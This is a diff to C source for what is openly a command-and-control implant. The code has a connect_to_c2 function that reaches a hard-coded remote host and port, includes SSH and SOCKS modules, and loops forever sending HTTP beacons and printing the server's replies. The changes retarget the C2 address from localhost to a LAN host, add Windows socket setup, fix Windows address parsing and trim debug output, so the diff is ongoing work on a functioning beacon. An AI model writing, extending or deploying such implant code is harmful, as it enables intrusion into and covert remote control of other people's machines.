@@ -63,10 +63,10 @@
 #include "ssh.h"
 #include "socks.h"
 
-#define RHOST "127.0.0.1"
+#define RHOST "192.168.1.13"
 #define RPORT 8000
 #define RPORT_STR "8000"
-#define BEACON_RESP_MAX_SIZE 2048
+#define BEACON_RESP_MAX_SIZE 1024
 
 #define ABORT (-1)
 #define RETRY 0
@@ -391,7 +391,8 @@ static int inet_pton(int af, const char *src, void *dst)
 	strncpy (srCopy, src, INET6_ADDRSTRLEN);
 	srCopy[INET6_ADDRSTRLEN] = 0;
 
-	if (WSAStringToAddress(srCopy, af, NULL, (struct sockaddr *)&ss, &iSize) == 0) {
+	int iRet;
+	if ((iRet = WSAStringToAddressA(srCopy, af, NULL, (struct sockaddr *)&ss, &iSize)) == 0) {
 		switch(af) {
 		case AF_INET:
 			*(struct in_addr *)dst = ((struct sockaddr_in *)&ss)->sin_addr;
@@ -401,43 +402,38 @@ static int inet_pton(int af, const char *src, void *dst)
 			return 1;
 		}
 	}
+	printf("iRet = %d\n", iRet);
+	printf("%d\n", WSAGetLastError());
 	return 0;
 }
 #endif
 
 int connect_to_c2(SOCKET_T *sockfd, const char *host, int port)
 {
-	// *sockfd = INVALID_SOCKET
-
 	/* Set host address and port */
-	printf("[*] Setting c2 address and port...");
 	struct sockaddr_in serv_addr;
 	memset(&serv_addr, 0, sizeof(serv_addr));
 	serv_addr.sin_family = AF_INET;
 	serv_addr.sin_port = htons(RPORT);
 	if (inet_pton(AF_INET, RHOST, &serv_addr.sin_addr) <= 0) {
-		printf("failed\n");
+		printf("[-] inet_pton\n");
 		return ABORT;
 	}
-	printf("done\n");
 
-	printf("[*] Creating socket...");
 	SOCKET_T sock = socket(AF_INET, SOCK_STREAM, 0);
 #ifdef WIN32
 	if (sock == INVALID_SOCKET) {
 #else
 	if (sock < 0) {
 #endif
-		printf("failed\n");
+		printf("[-] socket\n");
 		return ABORT;
 	}
-	printf("done\n");
 
 	/* Set receive timeout on socket */
 	struct timeval tv;
 	tv.tv_sec = timeout;
 	tv.tv_usec = 0;
-	printf("[*] Setting timeout %d seconds...", tv.tv_sec);
 #ifdef WIN32
 	if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
 		       sizeof(struct timeval)) == SOCKET_ERROR) {
@@ -445,10 +441,9 @@ int connect_to_c2(SOCKET_T *sockfd, const char *host, int port)
 	if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
 		       sizeof(struct timeval)) == -1) {
 #endif
-		printf("failed\n");
+		printf("[-] setsockopt\n");
 		return ABORT;
 	}
-	printf("done\n");
 
 #ifdef WIN32
 	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr))
@@ -932,6 +927,12 @@ int main(int argc, char *argv[])
 		"Content-Length: %d\r\n\r\n%s", strlen(beacon), beacon);
 	printf("done\n");
 
+	WSADATA wsaData;
+	if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+		printf("[-] WSAStartup failed\n");
+		return -1;
+	}
+
 	while (1) {
 		SOCKET_T sockfd;
 		int ret;
@@ -962,7 +963,7 @@ int main(int argc, char *argv[])
 			SLEEP(timeout);
 		} else {
 			printf("[*] Beacon sent.\n");
-			char *response;
+			char *response = NULL;
 			//char *response = get_beacon_resp(sockfd);
 			if (response) {
 				printf("[*] Server response:\n%s\n", response);
